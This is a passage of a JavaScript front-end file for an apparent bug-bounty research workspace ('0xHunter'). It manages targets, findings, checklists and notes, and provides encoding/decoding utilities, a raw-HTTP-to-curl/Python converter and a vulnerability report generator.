  const { data: clData, tid } = getActiveChecklistData();
  let val = clData[cid] || {checked: false, notes: ''};
  if (typeof val === 'boolean') val = {checked: val, notes: ''};
  val.notes = txt;
  clData[cid] = val;
  saveActiveChecklistData(tid, clData);
  closeModal('modal-checklist-note');
  renderChecklist();
  toast('Evidence saved');
};

window.exportChecklist = function() {
  const { data: clData, tid } = getActiveChecklistData();
  let tName = 'Workspace';
  if (tid) {
     const t = S.targets.find(x => x.id == tid);
     if (t) tName = t.name;
  }

  let allCats = [];
  Object.entries(checklists).forEach(([key, items]) => {
      let title = key;
      if (key === 'recon') title = 'Reconnaissance';
      if (key === 'web') title = 'Web Application';
      if (key === 'auth') title = 'Authentication';
      if (key === 'api') title = 'API Testing';
      if (key === 'data') title = 'Data Exposure';
      if (key === 'infra') title = 'Infrastructure';
      allCats.push({ id: key, title: title, items: items });
  });
  try {
      let custom = JSON.parse(S.config.custom_checklists || '[]');
      custom.forEach(c => allCats.push(c));
  } catch(e) {}

  let md = '# Security Testing Methodology & Checklist\\n';
  md += `Target: **${tName}**\\n\\n`;
  
  allCats.forEach(cat => {
      md += `## ${cat.title}\\n\\n`;
      cat.items.forEach((item, i) => {
          const cid = 'cl-' + cat.id + '-' + i;
          let val = clData[cid] || {};
          let isChecked = typeof val === 'boolean' ? val : val.checked;
          let mark = isChecked ? '[x]' : '[ ]';
          md += `- ${mark} ${item[0]} *(Severity: ${item[1].toUpperCase()})*\\n`;
          if (val.notes && val.notes.trim()) {
              md += `\\n  > **Evidence / Note:**\\n  > ${val.notes.replace(/\\n/g, '\\n  > ')}\\n\\n`;
          }
      });
      md += '\\n';
  });

  const a = document.createElement('a');
  a.href = 'data:text/markdown;charset=utf-8,' + encodeURIComponent(md);
  a.download = `0xHunter_Checklist_Export_${tName.replace(/[^a-z0-9]/gi, '_')}.md`;
  a.click();
  toast('Report exported', 'success');
};

window.resetChecklist = function() {
  showConfirm('Reset all checklist items? All progress and notes will be cleared.', () => {
    const { tid } = getActiveChecklistData();
    saveActiveChecklistData(tid, {});
    renderChecklist();
    toast('Checklist reset');
  });
};

async function deleteCustomChecklist(id) {
    const confirmed = await new Promise(res => showConfirm('Delete this custom checklist category? This cannot be undone.', () => res(true), () => res(false)));
    if (!confirmed) return;
    
    let custom = [];
    try { custom = JSON.parse(S.config.custom_checklists || '[]'); } catch(e) {}
    
    custom = custom.filter(c => c.id !== id);
    S.config.custom_checklists = JSON.stringify(custom);
    
    try {
        await fetch('/api/config', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ custom_checklists: S.config.custom_checklists })
        });
        toast('Custom checklist deleted');
        renderChecklist();
    } catch(e) {
        toast('Failed to delete', 'error');
    }
}

function openModal(id) { 
  document.getElementById(id).classList.add('open'); 
  document.body.classList.add('modal-open');
}
function closeModal(id) { 
  document.getElementById(id).classList.remove('open'); 
  // Check if any other modals are still open before removing class
  if (!document.querySelector('.modal.open')) {
    document.body.classList.remove('modal-open');
  }
}

function populateFindingTargets() {
  const sel = document.getElementById('f-target-id');
  if (!sel) return;
  sel.innerHTML = '<option value="">— No program link —</option>' +
    S.targets.map(t => `<option value="${t.id}">${esc(t.name)}</option>`).join('');
}

function openTargetModal(id) {
  editingTargetId = id || null;
  document.getElementById('modal-target-title').textContent = id ? '🎯 Edit Target' : '🎯 Add New Target';
  document.getElementById('target-save-btn').textContent = id ? 'Save Changes' : '+ Add Target';
  if (id) {
    const t = S.targets.find(x => x.id === id);
    if (!t) return;
    document.getElementById('t-name').value = t.name || '';
    document.getElementById('t-scope').value = t.scope || '';
    document.getElementById('t-outscope').value = t.outScope || '';
    document.getElementById('t-platform').value = t.platform || 'HackerOne';
    document.getElementById('t-status').value = t.status || 'active';
    document.getElementById('t-bounty').value = t.bounty || '';
    document.getElementById('t-url').value = t.url || '';
    document.getElementById('t-notes').value = t.notes || '';
    const deadEl = document.getElementById('t-deadline');
    if (deadEl) deadEl.value = t.deadline || '';
    const tagsEl = document.getElementById('t-tags');
    if (tagsEl) tagsEl.value = t.tags || '';
  } else {
    ['t-name', 't-scope', 't-outscope', 't-bounty', 't-url', 't-notes'].forEach(i => document.getElementById(i).value = '');
    document.getElementById('t-platform').value = 'HackerOne';
    document.getElementById('t-status').value = 'active';
    const deadEl = document.getElementById('t-deadline');
    if (deadEl) deadEl.value = '';
    const tagsEl = document.getElementById('t-tags');
    if (tagsEl) tagsEl.value = '';
  }
  openModal('modal-target');
}

function editTarget(id) { openTargetModal(id); }

async function saveTarget() {
  const name = document.getElementById('t-name').value.trim();
  if (!name) { toast('Enter a program name', 'error'); return; }
  const existing = editingTargetId ? S.targets.find(x => x.id === editingTargetId) : null;
  const t = {
    id: editingTargetId || Date.now(),
    name,
    scope: document.getElementById('t-scope').value,
    outScope: document.getElementById('t-outscope').value,
    platform: document.getElementById('t-platform').value,
    status: document.getElementById('t-status').value,
    bounty: document.getElementById('t-bounty').value,
    url: document.getElementById('t-url').value,
    notes: document.getElementById('t-notes').value,
    deadline: document.getElementById('t-deadline')?.value || '',
    tags: document.getElementById('t-tags')?.value || '',
    sessionTime: existing?.sessionTime || 0,
    created: existing?.created || Date.now()
  };
  if (editingTargetId) {
    const idx = S.targets.findIndex(x => x.id === editingTargetId);
    if (idx >= 0) S.targets[idx] = t;
  } else {
    S.targets.unshift(t);
    addActivity('Target added: <strong>' + esc(name) + '</strong>', '🎯');
  }
  await apiPost('/api/targets', t);
  save();
  updateBadges();
  renderPage(currentPage);
  closeModal('modal-target');
  editingTargetId = null;
  toast('Target saved');
}

function openFindingModal(id) {
  editingFindingId = id || null;
  currentScreenshots = [];
  populateFindingTargets();
  document.getElementById('modal-finding-title').textContent = id ? '🐛 Edit Finding' : '🐛 Document Finding';
  document.getElementById('finding-save-btn').textContent = id ? 'Save Changes' : 'Save Finding';
  if (id) {
    const f = S.findings.find(x => x.id === id);
    if (!f) return;
    document.getElementById('f-title').value = f.title || '';
    document.getElementById('f-sev').value = f.severity || 'medium';
    document.getElementById('f-type').value = f.type || 'XSS';
    document.getElementById('f-host').value = f.host || '';
    document.getElementById('f-status').value = f.status || 'Found';
    document.getElementById('f-endpoint').value = f.endpoint || '';
    document.getElementById('f-cvss').value = f.cvss || '';
    document.getElementById('f-desc').value = f.desc || '';
    document.getElementById('f-payload').value = f.payload || '';
    document.getElementById('f-bounty-earned').value = f.bountyEarned || f.bounty || '';
    document.getElementById('f-target-id').value = f.targetId || '';
    const tagsEl = document.getElementById('f-tags');
    if (tagsEl) tagsEl.value = f.tags || '';
    const remEl = document.getElementById('f-remediation');
    if (remEl) remEl.value = f.remediation || '';
    // Load screenshots
    try { currentScreenshots = JSON.parse(f.screenshots || '[]'); } catch(e) { currentScreenshots = []; }
  } else {
    ['f-title', 'f-host', 'f-endpoint', 'f-cvss', 'f-desc', 'f-payload', 'f-bounty-earned'].forEach(i => document.getElementById(i).value = '');
    document.getElementById('f-target-id').value = '';
    const tagsEl = document.getElementById('f-tags');
    if (tagsEl) tagsEl.value = '';
    const remEl = document.getElementById('f-remediation');
    if (remEl) remEl.value = '';
    currentScreenshots = [];
  }
  
  // Populate Quick Insert Payload Select
  const pSelect = document.getElementById('quick-payload-select');
  if (pSelect) {
    pSelect.innerHTML = '<option value="">⚡ Quick Insert...</option>' + 
      massivePayloads.map(p => `<option value="${esc(p.payload)}">[${esc(p.cat)}] ${esc(p.name)}</option>`).join('');
  }
  
  renderScreenshotPreviews();
  openModal('modal-finding');
}

function quickInsertPayload(val) {
  if (!val) return;
  const textarea = document.getElementById('f-payload');
  const current = textarea.value.trim();
  textarea.value = current ? current + '\n\n' + val : val;
  _markFindingUnsaved();
  toast('Payload inserted!');
}

function editFinding(id) { openFindingModal(id); }

async function saveFinding() {
  const title = document.getElementById('f-title').value.trim();
  if (!title) { toast('Enter a finding title', 'error'); return; }
  const targetIdVal = document.getElementById('f-target-id').value;
  const fHost = document.getElementById('f-host').value.trim();
  const fType = document.getElementById('f-type').value;
  const fEndpoint = document.getElementById('f-endpoint').value.trim();
  const existing = editingFindingId ? S.findings.find(x => x.id === editingFindingId) : null;

  // FEATURE E: Duplicate detection
  if (!editingFindingId && fHost && fType && fEndpoint) {
    const dup = S.findings.find(f =>
      f.host === fHost && f.type === fType && f.endpoint === fEndpoint
    );
    if (dup) {
      toast(`⚠️ Possible duplicate: "${dup.title}"`, 'error');
      // Don't block save — just warn the user
    }
  }

  const f = {
    id: editingFindingId || Date.now(),
    title,
    severity: document.getElementById('f-sev').value,
    type: fType,
    host: fHost,
    status: document.getElementById('f-status').value,
    endpoint: fEndpoint,
    cvss: document.getElementById('f-cvss').value,
    desc: document.getElementById('f-desc').value,
    payload: document.getElementById('f-payload').value,
    bountyEarned: document.getElementById('f-bounty-earned').value,
    targetId: targetIdVal ? parseInt(targetIdVal, 10) : null,
    tags: document.getElementById('f-tags')?.value || '',
    remediation: document.getElementById('f-remediation')?.value || '',
    screenshots: JSON.stringify(currentScreenshots || []),
    created: existing?.created || Date.now()
  };
  if (editingFindingId) {
    const idx = S.findings.findIndex(x => x.id === editingFindingId);
    if (idx >= 0) S.findings[idx] = f;
  } else {
    S.findings.unshift(f);
    addActivity('Finding: <strong>' + esc(title) + '</strong>', '🐛');
  }
  await apiPost('/api/findings', f);
  save();
  updateBadges();
  renderPage(currentPage);
  closeModal('modal-finding');
  editingFindingId = null;
  currentScreenshots = [];
  _findingUnsaved = false;
  _clearFindingUnsavedDot();
  toast('Finding saved', 'success');
}

function _markFindingUnsaved() {
  _findingUnsaved = true;
  const titleEl = document.getElementById('modal-finding-title');
  if (titleEl && !titleEl.querySelector('.unsaved-dot')) {
    const dot = document.createElement('span');
    dot.className = 'unsaved-dot';
    dot.title = 'Unsaved changes';
    dot.style.cssText = 'display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--orange);margin-left:8px;vertical-align:middle;';
    titleEl.appendChild(dot);
  }
}

function _clearFindingUnsavedDot() {
  const dot = document.getElementById('modal-finding-title')?.querySelector('.unsaved-dot');
  if (dot) dot.remove();
}

async function addNote() {
  const title = document.getElementById('n-title').value.trim() || 'Untitled Note';
  const note = {
    id: Date.now(),
    title,
    category: document.getElementById('n-cat').value,
    target: document.getElementById('n-target').value,
    content: document.getElementById('n-content').value,
    created: Date.now()
  };
  S.notes.unshift(note);
  addActivity('Note: <strong>' + esc(title) + '</strong>', '📝');
  await apiPost('/api/notes', note);
  save();
  updateBadges();
  closeModal('modal-note');
  document.getElementById('n-title').value = '';
  document.getElementById('n-content').value = '';
  goPage('notes');
  selectNote(note.id);
  toast('Note created');
}


const cmds = [
  { n: 'Add Target', k: '🎯', a: () => openTargetModal() },
  { n: 'Document Finding', k: '🐛', a: () => openFindingModal() },
  { n: 'New Note', k: '📝', a: () => openModal('modal-note') },
  { n: 'Go to Dashboard', k: '📊', a: () => goPage('dashboard') },
  { n: 'Go to Targets', k: '🎯', a: () => goPage('targets') },
  { n: 'Go to Findings', k: '🐛', a: () => goPage('findings') },
  { n: 'Go to Recon', k: '🔍', a: () => goPage('recon') },
  { n: 'Hunt Kit', k: '⚡', a: () => goPage('huntkit') },
  { n: 'Bookmarks', k: '🔖', a: () => goPage('bookmarks') },
  { n: 'Export Data', k: '⬇', a: exportData },
  { n: 'Export Findings CSV', k: '📊', a: exportFindingsCsv },
  ...(() => S.findings.slice(0, 20).map(f => ({ n: `Finding: ${f.title}`, k: sevLabels[f.severity] ? f.severity[0].toUpperCase() : '🐛', a: () => openFindingDetail(f.id) })))(),
];
function _rebuildCmds() {
  // Dynamically add findings to cmd palette — called after data load
  const findingCmds = S.findings.slice(0, 20).map(f => ({ n: `🐛 ${f.title}`, k: '🐛', a: () => openFindingDetail(f.id) }));
  return cmds.slice(0, 11).concat(findingCmds);
}
let cmdIdx = 0;

function openCmdPalette() {
  document.getElementById('cmd-palette').classList.add('open');
  document.getElementById('cmd-input').value = '';
  document.getElementById('cmd-input').focus();
  renderCmdResults('');
}
function closeCmdPalette() { document.getElementById('cmd-palette').classList.remove('open'); }

function renderCmdResults(q) {
  const allCmds = _rebuildCmds();
  const list = allCmds.filter(c => c.n.toLowerCase().includes(q.toLowerCase())).slice(0, 15);
  cmdIdx = 0;
  document.getElementById('cmd-results').innerHTML = list.map((c, i) => `
    <div class="cmd-result-item ${i === 0 ? 'focused' : ''}" data-idx="${i}">
      <div class="cmd-result-icon">${c.k}</div>
      <div class="cmd-result-text">${esc(c.n)}</div>
    </div>`).join('');
  document.querySelectorAll('.cmd-result-item').forEach((el, i) => {
    el.onclick = () => { closeCmdPalette(); list[i].a(); };
  });
}

function switchUtil(el, id) {
  document.querySelectorAll('.utab').forEach(e => e.classList.remove('active'));
  el.classList.add('active');
  document.querySelectorAll('.util-panel').forEach(e => e.classList.remove('active'));
  document.getElementById('util-' + id).classList.add('active');
}

function copyEl(id) {
  const el = document.getElementById(id);
  const text = el.tagName === 'TEXTAREA' || el.tagName === 'INPUT' ? el.value : el.textContent;
  navigator.clipboard.writeText(text).then(() => toast('Copied!'));
}

function encodeURL() {
  const i = document.getElementById('url-input');
  document.getElementById('url-output').textContent = encodeURIComponent(i.value);
}
function decodeURL() {
  try { document.getElementById('url-output').textContent = decodeURIComponent(document.getElementById('url-input').value); }
  catch (e) { toast('Invalid URL encoding'); }
}
function doubleEncodeURL() {
  document.getElementById('url-output').textContent = encodeURIComponent(encodeURIComponent(document.getElementById('url-input').value));
}
function doubleDecodeURL() {
  try { document.getElementById('url-output').textContent = decodeURIComponent(decodeURIComponent(document.getElementById('url-input').value)); }
  catch (e) { toast('Invalid Double URL encoding'); }
}

// Base32 helpers for full-page utils
const appB32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
function appBase32Encode(str) {
  let bin = "";
  for (let i = 0; i < str.length; i++) { bin += str.charCodeAt(i).toString(2).padStart(8, '0'); }
  let b32 = "";
  for (let i = 0; i < bin.length; i += 5) {
    let chunk = bin.substr(i, 5).padEnd(5, '0');
    b32 += appB32Alphabet[parseInt(chunk, 2)];
  }
  let pad = (8 - (b32.length % 8)) % 8;
  return b32 + "=".repeat(pad);
}
function appBase32Decode(str) {
  str = str.replace(/=+$/, '').toUpperCase().replace(/\s/g, '');
  if (!str) return "";
  let bin = "";
  for (let i = 0; i < str.length; i++) {
    let val = appB32Alphabet.indexOf(str[i]);
    if (val === -1) throw new Error("Invalid Base32 character: " + str[i]);
    bin += val.toString(2).padStart(5, '0');
  }
  let out = "";
  for (let i = 0; i < bin.length - (bin.length % 8); i += 8) {
    out += String.fromCharCode(parseInt(bin.substr(i, 8), 2));
  }
  return out;
}

function encodeB64() {
  try { document.getElementById('b64-output').textContent = btoa(unescape(encodeURIComponent(document.getElementById('b64-input').value))); }
  catch (e) { toast('Encode failed'); }
}
function decodeB64() {
  try { document.getElementById('b64-output').textContent = decodeURIComponent(escape(atob(document.getElementById('b64-input').value.trim()))); }
  catch (e) { toast('Invalid Base64'); }
}
function encodeB32() {
  try {
    const val = document.getElementById('b64-input').value;
    document.getElementById('b64-output').textContent = appBase32Encode(val);
  } catch (e) { toast('Encode failed: ' + e.message); }
}
function decodeB32() {
  try {
    const val = document.getElementById('b64-input').value.trim();
    document.getElementById('b64-output').textContent = appBase32Decode(val);
  } catch (e) { toast('Invalid Base32: ' + e.message); }
}

// Binary Encode / Decode
function binaryEncode() {
  const input = document.getElementById('bin-input').value;
  document.getElementById('bin-output').textContent = input.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
}
function binaryDecode() {
  try {
    const input = document.getElementById('bin-input').value;
    document.getElementById('bin-output').textContent = input.replace(/[\s\r\n]+/g, '').match(/.{1,8}/g)?.map(bin => String.fromCharCode(parseInt(bin, 2))).join('') || '';
  } catch (e) { toast('Invalid binary string'); }
}

// Rot13 & Reverse
function rot13Util() {
  const input = document.getElementById('rot-input').value;
  document.getElementById('rot-output').textContent = input.replace(/[a-zA-Z]/g, c => {
    const code = c.charCodeAt(0);
    const start = code >= 65 && code <= 90 ? 65 : 97;
    return String.fromCharCode(((code - start + 13) % 26) + start);
  });
}
function reverseUtil() {
  const input = document.getElementById('rot-input').value;
  document.getElementById('rot-output').textContent = input.split('').reverse().join('');
}

// Raw HTTP Request Converter
function parseRawHttpRequest(raw) {
  const result = {
    method: 'GET',
    path: '/',
    protocol: 'HTTP/1.1',
    host: '',
    headers: [],
    cookies: {},
    body: ''
  };

  if (!raw.trim()) return null;

  let headerPart = raw;
  let bodyPart = '';
  const doubleNewlineIndex = raw.indexOf('\n\n');
  const doubleNewlineRNIndex = raw.indexOf('\r\n\r\n');

  if (doubleNewlineRNIndex !== -1) {
    headerPart = raw.slice(0, doubleNewlineRNIndex);
    bodyPart = raw.slice(doubleNewlineRNIndex + 4);
  } else if (doubleNewlineIndex !== -1) {
    headerPart = raw.slice(0, doubleNewlineIndex);
    bodyPart = raw.slice(doubleNewlineIndex + 2);
  }

  const lines = headerPart.split(/\r?\n/);
  if (lines.length === 0) return null;

  const requestLine = lines[0].trim();
  const requestLineParts = requestLine.split(/\s+/);
  if (requestLineParts.length >= 1) result.method = requestLineParts[0];
  if (requestLineParts.length >= 2) result.path = requestLineParts[1];
  if (requestLineParts.length >= 3) result.protocol = requestLineParts[2];

  for (let i = 1; i < lines.length; i++) {
    const line = lines[i];
    const colonIndex = line.indexOf(':');
    if (colonIndex !== -1) {
      const key = line.slice(0, colonIndex).trim();
      const val = line.slice(colonIndex + 1).trim();
      result.headers.push({ key, val });
      if (key.toLowerCase() === 'host') {
        result.host = val;
      }
      if (key.toLowerCase() === 'cookie') {
        val.split(';').forEach(c => {
          const parts = c.split('=');
          if (parts.length >= 1) {
            const cKey = parts[0].trim();
            const cVal = parts.slice(1).join('=').trim();
            if (cKey) result.cookies[cKey] = cVal;
          }
        });
      }
    }
  }

  result.body = bodyPart;
  return result;
}

function generatePythonCode(parsed) {
  if (!parsed) return '';
  const scheme = 'https://';
  const host = parsed.host || 'target.com';
  const url = `${scheme}${host}${parsed.path}`;

  let code = `import requests\n\n`;
  code += `url = "${url}"\n\n`;

  let headersObj = {};
  parsed.headers.forEach(h => {
    const kLower = h.key.toLowerCase();
    if (kLower !== 'cookie' && kLower !== 'host') {
      headersObj[h.key] = h.val;
    }
  });

  code += `headers = ${JSON.stringify(headersObj, null, 4)}\n\n`;

  if (Object.keys(parsed.cookies).length > 0) {
    code += `cookies = ${JSON.stringify(parsed.cookies, null, 4)}\n\n`;
  } else {
    code += `cookies = {}\n\n`;
  }

  if (parsed.body) {
    try {
      const parsedJson = JSON.parse(parsed.body);
      code += `json_data = ${JSON.stringify(parsedJson, null, 4)}\n\n`;
      code += `response = requests.${parsed.method.toLowerCase()}(\n    url,\n    headers=headers,\n    cookies=cookies,\n    json=json_data\n)\n`;
    } catch (e) {
      code += `data = """${parsed.body.replace(/"""/g, '\\"\\"\\"')}"""\n\n`;
      code += `response = requests.${parsed.method.toLowerCase()}(\n    url,\n    headers=headers,\n    cookies=cookies,\n    data=data\n)\n`;
    }
  } else {
    code += `response = requests.${parsed.method.toLowerCase()}(\n    url,\n    headers=headers,\n    cookies=cookies\n)\n`;
  }

  code += `\nprint(f"Status Code: {response.status_code}")\n`;
  code += `print(response.text)\n`;
  return code;
}

function generateCurlCommand(parsed) {
  if (!parsed) return '';
  const scheme = 'https://';
  const host = parsed.host || 'target.com';
  const url = `${scheme}${host}${parsed.path}`;

  let cmd = `curl -X ${parsed.method} "${url}"`;

  parsed.headers.forEach(h => {
    const valEscaped = h.val.replace(/'/g, "'\\\\''");
    cmd += ` \\\n  -H "${h.key}: ${valEscaped}"`;
  });

  if (parsed.body) {
    const bodyEscaped = parsed.body.replace(/'/g, "'\\\\''");
    cmd += ` \\\n  -d '${bodyEscaped}'`;
  }

  return cmd;
}

function renderParsedDetails(parsed) {
  if (!parsed) return 'Invalid request';
  let html = `<strong>Method:</strong> <span style="color:var(--accent)">${esc(parsed.method)}</span><br>`;
  html += `<strong>Path:</strong> <span style="color:var(--green)">${esc(parsed.path)}</span><br>`;
  html += `<strong>Protocol:</strong> ${esc(parsed.protocol)}<br>`;
  html += `<strong>Host:</strong> ${esc(parsed.host)}<br><br>`;

  html += `<strong>Headers (${parsed.headers.length}):</strong><br>`;
  html += `<div style="padding-left:10px;color:var(--text2)">`;
  parsed.headers.forEach(h => {
    html += `<strong>${esc(h.key)}:</strong> ${esc(h.val)}<br>`;
  });
  html += `</div><br>`;

  if (Object.keys(parsed.cookies).length > 0) {
    html += `<strong>Cookies (${Object.keys(parsed.cookies).length}):</strong><br>`;
    html += `<div style="padding-left:10px;color:var(--text2)">`;
    for (const [k, v] of Object.entries(parsed.cookies)) {
      html += `<strong>${esc(k)}:</strong> ${esc(v)}<br>`;
    }
    html += `</div><br>`;
  }

  if (parsed.body) {
    html += `<strong>Body Length:</strong> ${parsed.body.length} bytes<br>`;
    html += `<strong>Body Content:</strong><br>`;
    html += `<pre style="background:var(--bg3);padding:6px;border-radius:4px;overflow-x:auto;">${esc(parsed.body)}</pre>`;
  }

  return html;
}

function convertRawRequest(mode) {
  const raw = document.getElementById('httpcode-in').value;
  const parsed = parseRawHttpRequest(raw);
  if (!parsed) {
    toast('Please enter a valid raw HTTP request');
    return;
  }

  document.getElementById('httpcode-output-container').style.display = 'grid';
  document.getElementById('httpcode-parsed').innerHTML = renderParsedDetails(parsed);

  const codeBox = document.getElementById('httpcode-code');
  if (mode === 'python') {
    codeBox.value = generatePythonCode(parsed);
  } else if (mode === 'curl') {
    codeBox.value = generateCurlCommand(parsed);
  }
}

function parseRawRequestOnly() {
  const raw = document.getElementById('httpcode-in').value;
  const parsed = parseRawHttpRequest(raw);
  if (!parsed) {
    toast('Please enter a valid raw HTTP request');
    return;
  }

  document.getElementById('httpcode-output-container').style.display = 'grid';
  document.getElementById('httpcode-parsed').innerHTML = renderParsedDetails(parsed);
  document.getElementById('httpcode-code').value = '// Click "Generate Python" or "Generate curl" to generate code here';
}

function clearRequestConverter() {
  document.getElementById('httpcode-in').value = '';
  document.getElementById('httpcode-parsed').innerHTML = '';
  document.getElementById('httpcode-code').value = '';
  document.getElementById('httpcode-output-container').style.display = 'none';
}

function encodeHTML() {
  const t = document.getElementById('html-input').value;
  document.getElementById('html-output').textContent = t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
function decodeHTML_() {
  const d = document.createElement('textarea');
  d.innerHTML = document.getElementById('html-input').value;
  document.getElementById('html-output').textContent = d.value;
}

function textToHex() {
  const hex = Array.from(document.getElementById('hex-input').value).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
  document.getElementById('hex-output').textContent = hex;
}
function hexToText() {
  try {
    const h = document.getElementById('hex-input').value.replace(/\s/g, '');
    document.getElementById('hex-output').textContent = h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
  } catch (e) { toast('Invalid hex'); }
}

function toUnicode() {
  document.getElementById('uni-output').textContent = Array.from(document.getElementById('uni-input').value)
    .map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
}
function fromUnicode() {
  try {
    document.getElementById('uni-output').textContent = document.getElementById('uni-input').value.replace(/\\u([0-9a-fA-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
  } catch (e) { toast('Invalid unicode'); }
}

function decodeJWT() {
  const token = document.getElementById('jwt-input').value.trim();
  const parts = token.split('.');
  if (parts.length < 2) { toast('Invalid JWT'); return; }
  try {
    const dec = s => JSON.stringify(JSON.parse(atob(s.replace(/-/g, '+').replace(/_/g, '/'))), null, 2);
    document.getElementById('jwt-header').textContent = dec(parts[0]);
    document.getElementById('jwt-payload-out').textContent = dec(parts[1]);
  } catch (e) { toast('Could not decode JWT'); }
}

async function computeHashes() {
  const text = document.getElementById('hash-input').value;
  const enc = new TextEncoder().encode(text);
  const buf = await crypto.subtle.digest('SHA-256', enc);
  const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
  const hr = document.getElementById('hash-results');
  if (hr) hr.innerHTML = '<div style="font-family:var(--mono);font-size:12px;word-break:break-all"><strong>SHA-256:</strong><br>' + esc(hex) + '</div>';
}

function testRegex() {
  const pattern = document.getElementById('regex-pattern').value;
  const flags = document.getElementById('regex-flags').value || 'g';
  const text = document.getElementById('regex-text').value;
  const out = document.getElementById('regex-output');
  try {
    const re = new RegExp(pattern, flags);
    const matches = [...text.matchAll(re)];
    out.textContent = matches.length ? matches.map((m, i) => `#${i + 1}: ${m[0]}`).join('\n') : 'No matches';
  } catch (e) { out.textContent = 'Error: ' + e.message; }
}

function populateReportSelects() {
  const fs = document.getElementById('rpt-finding');
  if (!fs) return;
  fs.innerHTML = '<option value="">— Select a Finding —</option><option value="all">Full Target Report (All Findings)</option>' +
    S.findings.map(f => `<option value="${f.id}">${esc(f.title)}</option>`).join('');
  const rt = document.getElementById('rpt-target');
  if (rt) {
    rt.innerHTML = '<option value="">— Optional program —</option>' +
      S.targets.map(t => `<option value="${t.id}">${esc(t.name)}</option>`).join('');
  }
}

let currentReportMarkdown = '';

function updateReport() {
  const fid = document.getElementById('rpt-finding').value;
  const tid = document.getElementById('rpt-target')?.value;
  const format = document.getElementById('rpt-format').value;
  const ctx = document.getElementById('rpt-context').value;
  const researcher = document.getElementById('rpt-researcher').value || 'Researcher';
  const title = document.getElementById('rpt-title').value || 'Vulnerability Report';
  const preview = document.getElementById('report-preview');
  
  if (!fid && !tid) { preview.innerHTML = '<div class="empty-state"><div class="es-sub">Select a finding or a program and click Generate...</div></div>'; return; }
  
  let targetFindings = [];
  let t = { name: 'N/A', url: '' };
  
  if (fid === 'all' && tid) {
    targetFindings = S.findings.filter(x => x.targetId == tid);
    t = S.targets.find(x => x.id == tid) || t;
    if (!targetFindings.length) { preview.innerHTML = '<div class="empty-state"><div class="es-sub">No findings for this program.</div></div>'; return; }
  } else if (fid && fid !== 'all') {
    const f = S.findings.find(x => x.id == fid);
    if (!f) return;
    targetFindings = [f];
    t = S.targets.find(x => x.id == tid) || S.targets.find(x => x.id == f.targetId) || t;
  } else if (tid && !fid) {
    // If only target selected, default to all findings for target
    targetFindings = S.findings.filter(x => x.targetId == tid);
    t = S.targets.find(x => x.id == tid) || t;
    if (!targetFindings.length) { preview.innerHTML = '<div class="empty-state"><div class="es-sub">No findings for this program.</div></div>'; return; }
  }
  
  const date = new Date().toISOString().split('T')[0];
  let md = `# ${title}

**Researcher:** ${researcher}  
**Date:** ${date}  
**Program:** ${t.name} (${t.url || 'N/A'})  
**Total Findings:** ${targetFindings.length}

---
`;

  targetFindings.forEach((f, idx) => {
    md += `
## ${idx + 1}. ${f.title}
**Severity:** ${(f.severity || '').toUpperCase()} | **Type:** ${f.type} | **Status:** ${f.status} | **CVSS:** ${f.cvss || 'N/A'}

### Summary
Affects \`${f.host || 'unknown'}${f.endpoint || ''}\`.

### Affected Asset
- Host: ${f.host || 'N/A'}
- Endpoint: ${f.endpoint || 'N/A'}

### Steps to Reproduce
${f.desc || '1. Navigate to the affected endpoint.\n2. Intercept and modify the request.\n3. Observe the vulnerable behavior.'}

### Proof of Concept
\`\`\`
${f.payload || 'N/A'}
\`\`\`

### Impact
${ctx || 'Describe business impact, affected users, and confidentiality/integrity/availability implications.'}

### Remediation
- Validate and sanitize all user-controlled input.
- Apply defense-in-depth controls (CSP, parameterized queries, access checks).
- Retest after fix deployment.
${f.remediation ? '\n' + f.remediation : ''}

---
`;
  });
  if (format === 'text') md = md.replace(/[#*`]/g, '');
  currentReportMarkdown = md;
  
  if (format === 'markdown' && typeof renderMarkdown === 'function') {
      preview.innerHTML = `<div style="padding:15px;background:var(--bg2);border-radius:var(--r);border:1px solid var(--border)">${renderMarkdown(md)}</div>`;
  } else if (format === 'html' && typeof renderMarkdown === 'function') {
      preview.innerHTML = `<div style="padding:15px;background:#fff;color:#333;border-radius:var(--r);border:1px solid var(--border)">${renderMarkdown(md)}</div>`;
  } else {
      preview.innerHTML = `<pre style="white-space:pre-wrap;font-size:13px;color:var(--text);font-family:var(--mono)">${esc(md)}</pre>`;
  }
}

function copyReport() {
  if (!currentReportMarkdown) return toast('Generate a report first', 'error');
  navigator.clipboard.writeText(currentReportMarkdown).then(() => toast('Report copied!', 'success'));
}

function downloadReport() {
  if (!currentReportMarkdown) { toast('Generate a report first', 'error'); return; }
  const format = document.getElementById('rpt-format').value;
  
  if (format === 'html' && typeof renderMarkdown === 'function') {
    const htmlContent = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Vulnerability Report</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.6; color: #333; max-width: 900px; margin: 0 auto; padding: 40px; }
  h1, h2, h3 { color: #111; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
  pre { background-color: #f6f8fa; padding: 16px; overflow: auto; border-radius: 6px; }
  code { font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace; font-size: 85%; background-color: rgba(27,31,35,0.05); padding: 0.2em 0.4em; border-radius: 6px; }
  pre code { background-color: transparent; padding: 0; }
  hr { height: 0.25em; padding: 0; margin: 24px 0; background-color: #e1e4e8; border: 0; }
</style>
</head>
<body>
${renderMarkdown(currentReportMarkdown)}
</body>
</html>`;
    const a = document.createElement('a');
    a.href = 'data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent);
    a.download = '0xHunter_Report_' + new Date().toISOString().split('T')[0] + '.html';
    a.click();
  } else {
    const a = document.createElement('a');
    a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(currentReportMarkdown);
